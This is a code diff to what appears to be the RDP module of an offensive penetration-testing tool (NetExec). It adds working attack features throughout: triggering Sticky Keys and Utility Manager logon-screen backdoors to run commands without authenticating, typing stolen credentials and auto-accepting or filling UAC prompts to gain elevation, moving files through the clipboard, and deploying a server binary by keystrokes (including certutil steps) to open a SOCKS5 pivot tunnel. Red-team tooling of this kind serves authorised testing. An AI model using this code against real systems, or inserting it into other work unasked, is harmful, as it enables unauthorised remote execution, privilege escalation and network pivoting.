@@ -30,6 +30,12 @@ from asyauth.common.constants import asyauthSecret
 from asysocks.unicomm.common.target import UniTarget, UniProto
 from asysocks.unicomm.client import UniClient
 
+from aardwolf.extensions.RDPEFS.providers.filesystem import FilesystemDriveProvider
+
+from nxc.protocols.rdp.dvc_socks import SocksDVChannel, run_socks_proxy
+from nxc.protocols.rdp.dvc_server import deploy_info
+from nxc.protocols.rdp.clipboard_file import push_session, pull_session, resolve_local_paths, resolve_dest_dir
+
 
 class rdp(connection):
     def __init__(self, args, db, host):
@@ -220,6 +226,13 @@ class rdp(connection):
             await self.terminate_conn()
 
     def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
+        if self.args.stickykeys or self.args.utilman:
+            self.admin_privs = True
+            self.username = username
+            self.password = password
+            trigger = "Sticky Keys (SHIFTx5)" if self.args.stickykeys else "Utility Manager (Win+U)"
+            self.logger.success(f"Splash backdoor mode: will fire {trigger} trigger")
+            return True
         try:
             lmhash = ""
             nthash = ""
@@ -275,6 +288,8 @@ class rdp(connection):
             asyncio.run(self.connect_rdp_with_cleanup())
 
             self.admin_privs = True
+            self.username = username
+            self.password = password
             self.logger.success(
                 "{}\\{}{} {}".format(
                     domain,
@@ -320,6 +335,19 @@ class rdp(connection):
             return False
 
     def plaintext_login(self, domain, username, password):
+        if self.args.stickykeys or self.args.utilman:
+            self.admin_privs = True
+            self.username = username
+            self.password = password
+            trigger = "Sticky Keys (SHIFTx5)" if self.args.stickykeys else "Utility Manager (Win+U)"
+            self.logger.success(f"Splash backdoor mode: will fire {trigger} trigger")
+            return True
+        if self.args.rdp_splash:
+            self.admin_privs = True
+            self.username = username
+            self.password = password
+            self.logger.success(f"{domain}\\{username}:{process_secret(password)} (splash screen login)")
+            return True
         try:
             self.auth = NTLMCredential(
                 secret=password,
@@ -331,6 +359,8 @@ class rdp(connection):
             asyncio.run(self.connect_rdp_with_cleanup())
 
             self.admin_privs = True
+            self.username = username
+            self.password = password
             self.logger.success(f"{domain}\\{username}:{process_secret(password)} {self.mark_pwned()}")
             if not self.args.local_auth and self.username != "":
                 add_user_bh(username, domain, self.logger, self.config)
@@ -354,6 +384,13 @@ class rdp(connection):
             return False
 
     def hash_login(self, domain, username, ntlm_hash):
+        if self.args.stickykeys or self.args.utilman:
+            self.admin_privs = True
+            self.username = username
+            self.password = ntlm_hash
+            trigger = "Sticky Keys (SHIFTx5)" if self.args.stickykeys else "Utility Manager (Win+U)"
+            self.logger.success(f"Splash backdoor mode: will fire {trigger} trigger")
+            return True
         try:
             self.auth = NTLMCredential(
                 secret=ntlm_hash,
@@ -365,6 +402,8 @@ class rdp(connection):
             asyncio.run(self.connect_rdp_with_cleanup())
 
             self.admin_privs = True
+            self.username = username
+            self.password = ntlm_hash
             self.logger.success(f"{self.domain}\\{username}:{process_secret(ntlm_hash)} {self.mark_pwned()}")
             if not self.args.local_auth and self.username != "":
                 add_user_bh(username, domain, self.logger, self.config)
@@ -436,6 +475,85 @@ class rdp(connection):
             self.logger.debug("Using fallback approach for opening command prompt")
             return False
 
+    async def send_scancode_combo(self, *vk_names):
+        """Press virtual keys down in order, release in reverse (for hotkey combos)."""
+        layout = KeyboardLayoutManager().get_layout_by_shortname("enus")
+        scancodes = [layout.vk_to_scancode(vk) for vk in vk_names]
+        for sc in scancodes:
+            await self.conn.send_key_scancode(sc, True, False)
+            await asyncio.sleep(0.05)
+        for sc in reversed(scancodes):
+            await self.conn.send_key_scancode(sc, False, False)
+            await asyncio.sleep(0.05)
+
+    async def send_tab(self):
+        """Send a Tab keystroke."""
+        await self.conn.send_key_virtualkey("VK_TAB", True, False)
+        await asyncio.sleep(0.05)
+        await self.conn.send_key_virtualkey("VK_TAB", False, False)
+
+    async def handle_uac(self, uac_username=None, uac_password=None):
+        """Handle the UAC prompt that appears after requesting elevation.
+
+        If credentials are provided, types them into the UAC credential prompt.
+        Otherwise sends Alt+Y to accept a consent-only prompt.
+        """
+        if uac_username is not None or uac_password is not None:
+            self.logger.debug("Filling UAC credential prompt")
+            if uac_username is not None:
+                await self._send_keystrokes(uac_username)
+            await self.send_tab()
+            if uac_password is not None:
+                await self._send_keystrokes(uac_password)
+            await self._send_enter()
+            self.logger.debug("Submitted UAC credentials")
+        else:
+            self.logger.debug("Sending Alt+Y to accept UAC consent prompt")
+            await self.send_scancode_combo("VK_LMENU", "VK_Y")
+
+    async def login_at_splash(self):
+        """Type credentials into the Windows logon screen (splash mode)."""
+        await asyncio.sleep(self.args.cmd_delay)
+        login_user = f"{self.domain}\\{self.username}" if self.domain else self.username
+        if self.args.field_order == "pass-only":
+            await self._send_keystrokes(self.password)
+        else:
+            if login_user:
+                await self._send_keystrokes(login_user)
+            await self.send_tab()
+            await self._send_keystrokes(self.password)
+        await self._send_enter()
+        self.logger.debug("Submitted credentials at logon screen")
+        await asyncio.sleep(self.args.cmd_delay)
+
+    async def fire_stickykeys(self):
+        """Send SHIFTx5 to trigger the Sticky Keys backdoor at the logon screen."""
+        self.logger.debug("Firing Sticky Keys trigger (SHIFTx5)")
+        layout = KeyboardLayoutManager().get_layout_by_shortname("enus")
+        shift_sc = layout.vk_to_scancode("VK_LSHIFT")
+        for _ in range(5):
+            await self.conn.send_key_scancode(shift_sc, True, False)
+            await asyncio.sleep(0.05)
+            await self.conn.send_key_scancode(shift_sc, False, False)
+            await asyncio.sleep(0.15)
+
+    async def fire_utilman(self):
+        """Send Win+U to trigger the Utility Manager backdoor at the logon screen."""
+        self.logger.debug("Firing Utility Manager trigger (Win+U)")
+        await self.send_scancode_combo("VK_LWIN", "VK_U")
+
+    def make_tsclient_drive(self):
+        from pathlib import Path
+        local_dir = Path(self.args.tsclient).resolve()
+        if not local_dir.is_dir():
+            self.logger.fail(f"TSClient path is not a directory: {local_dir}")
+            return None
+        name = self.args.tsclient_name
+        readonly = self.args.tsclient_ro
+        drive = FilesystemDriveProvider(name, str(local_dir), label=name, readonly=readonly)
+        self.logger.display(f"Mounting tsclient share: \\\\tsclient\\{name} -> {local_dir}{' (read-only)' if readonly else ''}")
+        return drive
+
     async def execute_shell(self, payload, get_output, shell_type):
         # Append | clip to send output to clipboard
         if shell_type == "cmd":
@@ -447,9 +565,35 @@ class rdp(connection):
             return None
         self.logger.debug(f"Executing command: {payload_with_clip}")
 
+        tsclient_drive = None
+        if self.args.tsclient:
+            tsclient_drive = self.make_tsclient_drive()
+            if tsclient_drive is None:
+                return None
+
         try:
-            self.conn = RDPConnection(iosettings=self.iosettings, target=self.target, credentials=self.auth)
-            await self.connect_rdp()
+            if self.args.rdp_splash or self.args.stickykeys or self.args.utilman:
+                splash_ios = RDPIOSettings()
+                splash_ios.video_width = self.iosettings.video_width
+                splash_ios.video_height = self.iosettings.video_height
+                splash_ios.video_bpp_min = 15
+                splash_ios.video_bpp_max = 32
+                splash_ios.video_out_format = VIDEO_FORMAT.PNG
+                splash_ios.clipboard_use_pyperclip = False
+                splash_ios.supported_protocols = SUPP_PROTOCOLS.SSL
+                if tsclient_drive:
+                    splash_ios.drives = [tsclient_drive]
+                splash_auth = NTLMCredential(secret="", username="", domain="", stype=asyauthSecret.PASS)
+                self.conn = RDPConnection(iosettings=splash_ios, target=self.target, credentials=splash_auth)
+                await self.connect_rdp()
+            else:
+                if tsclient_drive:
+                    self.iosettings.drives = [tsclient_drive]
+                self.conn = RDPConnection(iosettings=self.iosettings, target=self.target, credentials=self.auth)
+                await self.connect_rdp()
+            if tsclient_drive:
+                channels = list(getattr(self.conn, "_RDPConnection__joined_channels", {}).keys())
+                self.logger.debug(f"Active channels: {channels}")
         except Exception as e:
             self.logger.debug(f"Error connecting to RDP: {e!s}")
             return None
@@ -488,26 +632,53 @@ class rdp(connection):
             await asyncio.sleep(self.args.cmd_delay)
 
             try:
-                # Try to open Run dialog using Windows+R
-                self.logger.debug("Attempting to open Run dialog")
-                win_r_success = await self._send_win_r()
+                if self.args.stickykeys or self.args.utilman:
+                    if self.args.stickykeys:
+                        await self.fire_stickykeys()
+                    else:
+                        await self.fire_utilman()
+                    await asyncio.sleep(self.args.settle_after_trigger)
 
-                if win_r_success:
-                    self.logger.debug(f"Launching {shell_type} via Run dialog")
-                    await self._send_keystrokes(f"{shell_type}.exe")
+                    if shell_type == "powershell":
+                        self.logger.debug("Opening PowerShell from backdoor cmd shell")
+                        await self._send_keystrokes("powershell.exe")
+                        await self._send_enter()
+                        await asyncio.sleep(self.args.cmd_delay)
+
+                    self.logger.debug(f"Typing command: {payload_with_clip}")
+                    await self._send_keystrokes(payload_with_clip)
                     await self._send_enter()
-                    await asyncio.sleep(self.args.cmd_delay)  # Wait for cmd window to open
                 else:
-                    # Fallback: Try direct command typing (assumes cmd may already be open)
-                    self.logger.debug(f"Sending {shell_type} command directly")
-                    await self._send_keystrokes(f"{shell_type}.exe")
-                    await self._send_enter()
-                    await asyncio.sleep(self.args.cmd_delay)
+                    if self.args.rdp_splash:
+                        await self.login_at_splash()
 
-                # Type the command with | clip
-                self.logger.debug(f"Typing command: {payload_with_clip}")
-                await self._send_keystrokes(payload_with_clip)
-                await self._send_enter()
+                    self.logger.debug("Attempting to open Run dialog")
+                    win_r_success = await self._send_win_r()
+
+                    if win_r_success:
+                        self.logger.debug(f"Launching {shell_type} via Run dialog")
+                        await self._send_keystrokes(f"{shell_type}.exe")
+
+                        if self.args.elevated:
+                            self.logger.debug("Requesting elevation via Ctrl+Shift+Enter")
+                            await self.send_scancode_combo("VK_LCONTROL", "VK_LSHIFT", "VK_RETURN")
+                            await asyncio.sleep(self.args.uac_settle)
+                            uac_user = self.args.uac_username or self.username
+                            uac_pass = self.args.uac_password or self.password
+                            await self.handle_uac(uac_user, uac_pass)
+                        else:
+                            await self._send_enter()
+
+                        await asyncio.sleep(self.args.cmd_delay)
+                    else:
+                        self.logger.debug(f"Sending {shell_type} command directly")
+                        await self._send_keystrokes(f"{shell_type}.exe")
+                        await self._send_enter()
+                        await asyncio.sleep(self.args.cmd_delay)
+
+                    self.logger.debug(f"Typing command: {payload_with_clip}")
+                    await self._send_keystrokes(payload_with_clip)
+                    await self._send_enter()
 
                 # Wait for command to execute
                 await asyncio.sleep(self.args.cmd_delay)
@@ -632,3 +803,115 @@ class rdp(connection):
     def nla_screenshot(self):
         if not self.nla:
             asyncio.run(self.nla_screen())
+
+    def put_file(self):
+        local_path, remote_dir = self.args.put_file
+        resolved = resolve_local_paths(self, [local_path])
+        if resolved is None:
+            return
+        self.logger.display(f"Pushing {local_path} -> {remote_dir} via clipboard")
+        asyncio.run(push_session(self, resolved, remote_dir))
+
+    def get_file(self):
+        remote_path, local_dir = self.args.get_file
+        dest = resolve_dest_dir(local_dir)
+        self.logger.display(f"Pulling {remote_path} -> {dest} via clipboard")
+        asyncio.run(pull_session(self, [remote_path], dest))
+
+    def rdp_dvc_socks5(self):
+        bind_str = self.args.rdp_dvc_socks5
+        if ":" in bind_str:
+            bind_host, bind_port = bind_str.rsplit(":", 1)
+            bind_port = int(bind_port)
+        else:
+            bind_host = bind_str
+            bind_port = 1080
+
+        channel_name = self.args.dvc_channel
+        method = self.args.dvc_method
+
+        self.logger.display(f"DVC SOCKS5: method={method}, channel={channel_name}, bind={bind_host}:{bind_port}")
+
+        try:
+            clipboard, commands = deploy_info(method, channel_name)
+        except RuntimeError as e:
+            self.logger.fail(str(e))
+            return
+
+        asyncio.run(self.dvc_socks5_session(bind_host, bind_port, channel_name, clipboard, commands))
+
+    async def dvc_socks5_session(self, bind_host, bind_port, channel_name, clipboard, commands):
+        dvc_channel = SocksDVChannel(channel_name)
+
+        ios = RDPIOSettings()
+        ios.video_width = self.iosettings.video_width
+        ios.video_height = self.iosettings.video_height
+        ios.video_bpp_min = 15
+        ios.video_bpp_max = 32
+        ios.video_out_format = VIDEO_FORMAT.PNG
+        ios.clipboard_use_pyperclip = False
+        ios.vchannels[channel_name] = dvc_channel
+
+        self.conn = RDPConnection(iosettings=ios, target=self.target, credentials=self.auth)
+
+        try:
+            await self.connect_rdp()
+        except Exception as e:
+            self.logger.fail(f"RDP connection failed: {e}")
+            return
+
+        try:
+            self.logger.debug("Waiting for desktop")
+            await asyncio.sleep(self.args.cmd_delay)
+
+            if clipboard:
+                await self.conn.set_current_clipboard_text(clipboard)
+                await asyncio.sleep(0.5)
+                self.logger.debug("Clipboard set with binary payload")
+
+            self.logger.debug("Deploying server component via Win+R")
+            if not await self._send_win_r():
+                self.logger.fail("Failed to open Run dialog")
+                return
+
+            await self._send_keystrokes(commands[0], delay=0.01)
+            await asyncio.sleep(0.3)
+            await self._send_enter()
+
+            for cmd in commands[1:]:
+                if "gcb" in cmd:
+                    await asyncio.sleep(3.0)
+                elif "certutil" in cmd:
+                    await asyncio.sleep(5.0)
+                elif "start" in cmd:
+                    await asyncio.sleep(2.0)
+                else:
+                    await asyncio.sleep(1.0)
+                await self._send_keystrokes(cmd, delay=0.01)
+                await self._send_enter()
+
+            self.logger.debug("Server deploy commands sent, waiting for DVC channel")
+
+            try:
+                await asyncio.wait_for(dvc_channel.channel_ready.wait(), timeout=30.0)
+            except TimeoutError:
+                self.logger.fail("DVC channel was not established within 30 seconds")
+                return
+
+            self.logger.success(f"DVC SOCKS5 tunnel established — proxy listening on {bind_host}:{bind_port}")
+            self.logger.highlight("Press Ctrl+C to stop the proxy and disconnect")
+
+            disconnected = asyncio.Event()
+            try:
+                await run_socks_proxy(dvc_channel, bind_host, bind_port, disconnected)
+            except KeyboardInterrupt:
+                self.logger.display("Shutting down SOCKS5 proxy")
+            finally:
+                disconnected.set()
+
+        except KeyboardInterrupt:
+            self.logger.display("Interrupted — disconnecting")
+        except Exception as e:
+            self.logger.fail(f"DVC SOCKS5 error: {e}")
+        finally:
+            await self.terminate_conn()
